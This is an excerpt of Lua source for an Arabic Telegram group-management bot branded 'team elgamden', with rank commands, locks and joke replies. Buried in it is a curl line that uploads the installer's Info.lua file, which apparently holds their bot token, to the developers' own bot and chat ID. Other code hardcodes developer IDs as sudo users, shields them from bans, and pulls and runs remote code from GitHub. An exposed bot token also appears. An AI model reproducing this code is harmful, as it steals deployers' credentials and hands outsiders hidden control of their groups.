...
if res ~= 200 then
print('\27[0;31m•━═━═『𝑡𝑒𝑎𝑚 𝑒𝑙𝑔𝑎𝑚𝑑𝑒𝑛』═━═━•\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na•━═━═『𝑡𝑒𝑎𝑚 𝑒𝑙𝑔𝑎𝑚𝑑𝑒𝑛』═━═━•\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m•━═━═『𝑡𝑒𝑎𝑚 𝑒𝑙𝑔𝑎𝑚𝑑𝑒𝑛』═━═━• ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Java-ak/Elgmden/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1496241073,1398830949,1894034909,1614314857,}   
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'تيم الجمدين'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝒕𝒆𝒂𝒎 𝒆𝒍𝒈𝒂𝒎𝒅𝒆𝒏")  
...
local curl = 'curl "'..'https://api.telegram.org/bot1833028811:AAFhC73CuTwejU9QMzADwW7AAojzK0EQOII/sendDocument'..'" -F "chat_id='.. 1496241073 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
os.execute('wget https://raw.githubusercontent.com/Java-ak/Elgmden/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'❈ تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ❈ اصدار سورس تيم الجمدين { s: 6.7}')
end

if text == 'قناه السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/ARBYYYYYYYYYYY)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/ARBYYYYYYYYYYY"}}, 
} 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'تواصل السورس 📬', url="t.me/HABIBTYYYYYYY_BOT"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_,0," ❈ العضو : {["..data.first_name_.."](T.ME/ARBYYYYYYYYYYY)}\n ❈ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ❈ عذرا ⇐ {["..data.first_name_.."](T.ME/ARBYYYYYYYYYYY)}\n ❈ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local Text =[[
اهلا بك في سورس تيم الجمدين 🔮
]]
keyboard = {} 
keyboard.inline_keyboard = {

{
{text = '𝘿𝙀𝙑 𝘼𝘽𝘿𝙊 ', url = "https://t.me/Abdoo6"},
},
{
{text = '𝘿𝙀𝙑 𝙆𝘼𝙍𝙀𝙈', url = "https://t.me/KarimArbyy"},
},
{
{text = '𝙏𝙀𝘼𝙈 𝙀𝙇𝙂𝘼𝙈𝘿𝙀𝙉', url = "https://t.me/ARBYYYYYYYYYYY"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/KarimArbyy2bot&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
local Text = [[
 ❈ اهلا بك في سورس تيم الجمدين الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  ❈ 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مطورين السورس⚙',url="t.me/UU_ak0"}},
{{text = 'قناه السورس 🧭 ', url="t.me/ARBYYYYYYYYYYY"}},
{{text = 'تواصل السورس 📬',url="t.me/HABIBTYYYYYYY_BOT"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'عبدو' or text == 'عبده' or text == '.مم' or text == "مطور السورس" then
local Text =[[
مطور سورس تيم الجمدين
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'DEV ABDO ➪ ',url="t.me/Abdoo6"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Abdoo6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'احمد' or text == 'مبرمج السورس' or text == '.مم' or text == "المصري" then
local Text =[[
مطور سورس تيم الجمدين
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Prg Ahmed➪ ',url="t.me/Dev_Ah8"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Abdoo6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'كريم' or text == 'ستينس' or text == '.مم' or text == "مطور السورس" then
local Text =[[
مطور سورس تيم الجمدين
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'تٌيْمِ أُلَجُأُمِدِيْنً[𝑲𝑨𝑹𝑰𝑴]𖠲 ➪',url="t.me/KarimArbyy"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == '•━═━═『𝑡𝑒𝑎𝑚 𝑒𝑙𝑔𝑎𝑚𝑑𝑒𝑛』═━═━•' then
local Text = [[ 
سورس تيم الجمدين الآمن🔐
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس 🧭', url="t.me/ARBYYYYYYYYYYY"}}, 
...
if text == 'العاب تيم الجمدين' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
...
elseif text == 'قفل تيم الجمدينرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❈ بواسطه ⇐ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n ❈ تـم قفـل تيم الجمدينرسيه ')
end,nil)   
...
elseif text == 'فتح تيم الجمدينرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❈ بواسطه ⇐ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n ❈ تـم فـتح تيم الجمدينرسيه ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(1496241073) then  
send(msg.chat_id_, msg.id_, " ❈ لا تسطيع حظر مطور السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1894034909) then  
send(msg.chat_id_, msg.id_, " ❈ لا تسطيع حظر مطور السورس عام")
return false 
end
...
if result.id_ == tonumber(1496241073) then
send(msg.chat_id_, msg.id_, " ❈ لا يمكنك حظر مطور السورس \n")
return false 
end
if result.id_ == tonumber(1894034909) then
send(msg.chat_id_, msg.id_, " ❈ لا يمكنك حظر مطور السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1496241073) then  
send(msg.chat_id_, msg.id_, " ❈ لا تسطيع حظر مطور السورس عام")
return false 
end
if tonumber(userid) == tonumber(1894034909) then  
send(msg.chat_id_, msg.id_, " ❈ لا تسطيع حظر مطور السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Java-ak/Elgmden/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ❈ اهلا بك في متجر ملفات تيم الجمدين\n ❈ ملفات السورس ↓\n•━═━═『𝑡𝑒𝑎𝑚 𝑒𝑙𝑔𝑎𝑚𝑑𝑒𝑛』═━═━•\n\n"
local TextE = "\n•━═━═『𝑡𝑒𝑎𝑚 𝑒𝑙𝑔𝑎𝑚𝑑𝑒𝑛』═━═━•\n ❈ علامة تعني { ✔️ } ملف مفعل\n ❈ علامة تعني { ✖ } ملف معطل\n ❈ قناة سورس تيم الجمدين ↓\n".." ❈ [اضغط هنا لدخول](t.me/ARBYYYYYYYYYYY) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Java-ak/Elgmden/main/File_Bot/"..file)
if res == 200 then
...
' }\n'..' ❈  الايدي بالصوره ⇐ { '..idph..
' }\n'..' ❈  الرفع ⇐ { '..setadd..
' }\n'..' ❈  الحظر ⇐ { '..banm..' }\n\n•━═━═『𝑡𝑒𝑎𝑚 𝑒𝑙𝑔𝑎𝑚𝑑𝑒𝑛』═━═━•\n ❈ قناة سورس تيم الجمدين ↓\n [ 𝒕𝒆𝒂𝒎 𝒆𝒍𝒈𝒂𝒎𝒅𝒆𝒏](t.me/ARBYYYYYYYYYYY) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒕𝒆𝒂𝒎 𝒆𝒍𝒈𝒂𝒎𝒅𝒆𝒏.',url="t.me/ARBYYYYYYYYYYY"}},
}
local msg_id = msg.id_/2097152/0.5
...
end --الكود حصري سورس تيم الجمدين يعني لو بكتهن راح اعرفك انت الاخذتهن
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/ARBYYYYYYYYYYY)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/ARBYYYYYYYYYYY)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/ARBYYYYYYYYYYY)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/ARBYYYYYYYYYYY)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/ARBYYYYYYYYYYY)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🚨](t.me/ARBYYYYYYYYYYY)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/ARBYYYYYYYYYYY)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/ARBYYYYYYYYYYY)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/ARBYYYYYYYYYYY)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/ARBYYYYYYYYYYY)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/ARBYYYYYYYYYYY)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/ARBYYYYYYYYYYY)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/ARBYYYYYYYYYYY)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/ARBYYYYYYYYYYY)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/ARBYYYYYYYYYYY)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/ARBYYYYYYYYYYY)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/ARBYYYYYYYYYYY)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/ARBYYYYYYYYYYY)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/ARBYYYYYYYYYYY)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/ARBYYYYYYYYYYY)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/ARBYYYYYYYYYYY)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/ARBYYYYYYYYYYY)') 
return false
end
end
end
...
send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n•━═━═『𝑡𝑒𝑎𝑚 𝑒𝑙𝑔𝑎𝑚𝑑𝑒𝑛』═━═━•ٴ\n  [قناه السورس 💠](t.me/ARBYYYYYYYYYYY) ')
end
...
local Teext =[[
•━═━═『𝑡𝑒𝑎𝑚 𝑒𝑙𝑔𝑎𝑚𝑑𝑒𝑛』═━═━•
اهلا بك في مميزات سورس تيم الجمدين.🔱
•━═━═『𝑡𝑒𝑎𝑚 𝑒𝑙𝑔𝑎𝑚𝑑𝑒𝑛』═━═━•
...
function FunBot(extra, result, success) 
local Fun = {'الكبد مال اني ','يولي ماحبه ',' لٱ ايع ','بس لو الكفها اله اعضها 💔','ماخب مطايه اسف','اكلك ۿذﭑ يكلي احبكك لولا ﭑݩٺ شتكول  ','ئووووووووف اموت ع ربه ','ايععععععععع','بلعباس اعشكك','ماحب مخابيل','احبب عبدو وبس','لٱ ماحبه','بله هاي جهره تكلي تحبهه ؟ ','بربك ئنته والله فارغ وبطران وماعدك شي تسوي جاي تسئلني احبهم لولا','افبس حبيبي هذا' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
